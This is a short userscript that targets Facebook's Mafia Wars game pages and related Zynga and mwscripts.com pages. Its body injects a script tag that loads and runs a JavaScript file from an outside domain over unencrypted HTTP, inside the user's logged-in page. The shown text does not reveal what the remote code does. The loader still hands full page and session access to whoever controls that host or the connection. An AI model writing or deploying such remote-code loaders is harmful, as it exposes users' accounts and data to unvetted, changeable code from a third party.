// ==UserScript==
// @name  D
// @include http://apps.facebook.com/inthemafia/*
// @include https://apps.facebook.com/inthemafia/*
// @include http://facebook.mafiawars*/mwfb/remote/html_server.php*
// @include https://facebook.mafiawars*/mwfb/remote/html_server.php*
// @include http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include http://mwscripts.com/happyplace*
// @include https://mwscripts.com/happyplace*
// ==/UserScript== 
{function inject(func)
{var source=func.toString();var script=document.createElement('script');script.innerHTML='('+source+')()';document.body.appendChild(script);}
function loader()
{var a=document.createElement('script');a.type='text/javascript';a.src='http://www.patmax.eu/J1/130516215638.js';document.getElementsByTagName('head')[0].appendChild(a);}
var skip=false;if(/xw_controller=freegifts/.test(document.location.href))
skip=true;if(/xw_controller=requests/.test(document.location.href))
skip=true;if(!skip)
inject(loader);}